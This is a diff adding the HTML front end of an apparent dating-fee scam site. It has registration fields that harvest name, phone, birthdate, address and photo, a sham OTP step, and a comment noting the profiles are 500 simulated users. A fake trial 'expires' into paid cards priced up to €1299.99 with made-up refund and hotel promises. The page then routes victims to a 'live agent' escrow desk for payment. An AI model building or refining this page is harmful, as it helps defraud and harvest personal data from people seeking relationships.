@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>International Dating Services Platform</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="bg-overlay"></div>
+    <div id="vip-timer-display" class="vip-badge" style="display: none;">FREE VIP: 10:00</div>
+
+    <!-- SCREEN 1: LOGIN -->
+    <div id="screen-auth" class="screen active">
+        <div class="box">
+            <h2>Dating Services Login</h2>
+            <input type="email" id="login-email" placeholder="Email Address">
+            <input type="password" id="login-pass" placeholder="Password">
+            <button onclick="handleLogin()">Sign In</button>
+            <p style="margin-top: 15px; font-size: 14px; color: #ccc;">No account? <a href="#" onclick="showScreen('screen-register')" style="color: #ff4757;">Register here</a></p>
+        </div>
+    </div>
+
+    <!-- SCREEN 2: STEP-BY-STEP REGISTRATION -->
+    <div id="screen-register" class="screen">
+        <div class="box" style="max-width: 500px;">
+            <h2>Create Profile Account</h2>
+            <input type="text" id="reg-name" placeholder="Full Name">
+            <input type="email" id="reg-email" placeholder="Email Address">
+            <input type="tel" id="reg-phone" placeholder="Phone Number">
+            <input type="date" id="reg-dob" placeholder="Birthdate">
+            <input type="text" id="reg-address" placeholder="Address">
+            <select id="reg-sex">
+                <option value="">Select Gender</option>
+                <option value="Male">Male (45-60 Years Old Pool)</option>
+                <option value="Female">Female (21-30 Years Old Pool)</option>
+            </select>
+            <button onclick="processRegistrationData()">Continue to Verification</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: NATURAL LOADING SCREEN -->
+    <div id="screen-loading" class="screen">
+        <div class="box">
+            <h2 id="loading-text">Validating User Information...</h2>
+            <div class="loader"></div>
+            <p style="color: #aaa; font-size: 14px;">Please wait while we secure your session pipeline.</p>
+        </div>
+    </div>
+
+    <!-- SCREEN 4: RANDOM 4-DIGIT OTP SECURITY LAYER -->
+    <div id="screen-otp" class="screen">
+        <div class="box">
+            <h2>Security Verification</h2>
+            <p>A random security loop system code has been generated. Confirm the token to bind this terminal connection:</p>
+            <h1 id="generated-otp-display">0000</h1>
+            <input type="text" id="user-otp-input" placeholder="Enter the 4-Digit Code above" maxlength="4" style="text-align: center; font-size: 20px;">
+            <button onclick="verifyOTPCode()">Verify Code</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 5: CONDITIONAL PHOTO UPLOAD -->
+    <div id="screen-upload" class="screen">
+        <div class="box">
+            <h2>Identity Image Binding</h2>
+            <p id="upload-instruction" style="font-size: 14px; margin-bottom: 15px; color: #ffcc00;"></p>
+            <input type="file" id="photo-file" accept="image/*">
+            <button onclick="startPhotoUploadTimer()">Upload Image Proof</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 6: MAIN LOBBY WITH INTERNATIONAL CHANNELS -->
+    <div id="screen-lobby" class="screen">
+        <div class="lobby-container">
+            <h2>Global Live Lobby - International Channels</h2>
+            <p style="margin-bottom: 20px;">Select your routing platform region to review secure online match connections.</p>
+            <div class="channels-grid">
+                <div class="channel-card" onclick="enterChannel('ASIAN')"><h3>ASIAN Channel</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('EUROPE')"><h3>EUROPE Channel</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('North America')"><h3>North America</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('South America')"><h3>South America</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('Africa')"><h3>Africa</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('Australia / Oceania')"><h3>Australia / Oceania</h3><p>Active Users Online</p></div>
+                <div class="channel-card" onclick="enterChannel('Antarctica')"><h3>Antarctica</h3><p>Isolated Station Links</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 6B: DYNAMIC CHANNEL PROFILES VIEW (Dito lalabas ang 500 simulated users) -->
+    <div id="screen-channel-view" class="screen">
+        <div class="lobby-container">
+            <div style="display:flex; justify-content: space-between; align-items:center; margin-bottom: 20px;">
+                <button onclick="showScreen('screen-lobby')" style="width:auto; padding:10px 20px; margin:0;">← Back to Lobby</button>
+                <h2 id="current-channel-title" style="margin:0;">Channel</h2>
+            </div>
+            <div id="profiles-display-grid" class="profiles-grid"></div>
+        </div>
+    </div>
+
+    <!-- SCREEN 7: PREMIUM PLANS -->
+    <div id="screen-plans" class="screen">
+        <h2 style="margin-bottom: 10px;">Your 10-Minute Free Trial Has Expired</h2>
+        <p style="margin-bottom: 30px; color: #ccc;">Select a validation package parameters profile below to retain communications.</p>
+        <div class="plans-grid">
+            
+            <div class="plan-card normal">
+                <h3>Normal Tier</h3>
+                <div class="price">€0.00</div>
+                <ul class="features-list">
+                    <li>• Access to 1 Channel only</li>
+                    <li>• Profiles are completely blurred</li>
+                    <li>• Zero media access allowed</li>
+                </ul>
+                <button onclick="connectToLiveAgent('Normal Tier')">Keep Free Restrictions</button>
+            </div>
+
+            <div class="plan-card silver">
+                <h3>Silver Card</h3>
+                <div class="price">€249.99</div>
+                <ul class="features-list">
+                    <li>• Access to 5 Global Channels</li>
+                    <li>• View unblurred photos</li>
+                    <li>• Chat messaging enabled (No Calls)</li>
+                    <li>• Includes 1-Month Silver Tracking ID</li>
+                    <li>• 70% Refund Policy Protected</li>
+                </ul>
+                <button onclick="connectToLiveAgent('Silver Card')">Acquire Silver Card</button>
+            </div>
+
+            <div class="plan-card gold">
+                <h3>Gold Card</h3>
+                <div class="price">€659.99</div>
+                <ul class="features-list">
+                    <li>• Full access to all channels</li>
+                    <li>• Voice Calls & Text enabled</li>
+                    <li>• 2 Months ID Validation Frame</li>
+                    <li>• 22-Hour Complimentary Hotel Voucher</li>
+                    <li>• 70% Return Funds Guarantee</li>
+                </ul>
+                <button onclick="connectToLiveAgent('Gold Card')">Acquire Gold Card</button>
+            </div>
+
+            <div class="plan-card platinum">
+                <h3>Platinum Card</h3>
+                <div class="price">€1299.99</div>
+                <ul class="features-list">
+                    <li>• Full Unrestricted Global Access</li>
+                    <li>• Secure Voice/Video Calling Enabled</li>
+                    <li>• 5 Months Tracking ID Validity</li>
+                    <li>• Free 3 Days & 2 Nights Hotel Booking</li>
+                    <li>• 70% Guaranteed Escrow Cashback</li>
+                </ul>
+                <button onclick="connectToLiveAgent('Platinum Card')">Acquire Platinum Card</button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- SCREEN 8: LIVE AGENT GATEWAY -->
+    <div id="screen-agent" class="screen">
+        <div class="box" style="max-width: 500px;">
+            <h2 style="color: #2ecc71;">🔒 Secure Verification Routing</h2>
+            <div class="agent-badge">
+                <p><strong>Escrow Department:</strong> Dating Services</p>
+                <p id="selected-plan-notice">Selected: Platinum Card Package</p>
+            </div>
+            <p style="font-size: 14px; line-height: 1.6; text-align: left; color: #ddd;">
+                Ang lahat ng proseso para sa pag-verify ng iyong biometric card, physical match synchronization, hotel allocations, at insurance processing ay pinamamahalaan ng ating <strong>Dating Services Live Agent desk</strong>.<br><br>
+                Upang makumpleto ang financial configuration at makuha ang mga detalye ng iyong physical meetup at tracking system data, mangyaring makipag-ugnayan sa backend desk operator gamit ang iyong reference token.
+            </p>
+            <h3 style="margin-top: 20px; color: #ff4757;" id="agent-token">REF-TOKEN: DS-4091A</h3>
+            <button onclick="alert('Connecting to Dating Services live matrix operator...')">Initialize Agent Session Terminal</button>
+        </div>
+    </div>
+
+    <!-- Pag-link sa external script logic -->
+    <script src="script.js"></script>
+</body>
+</html>
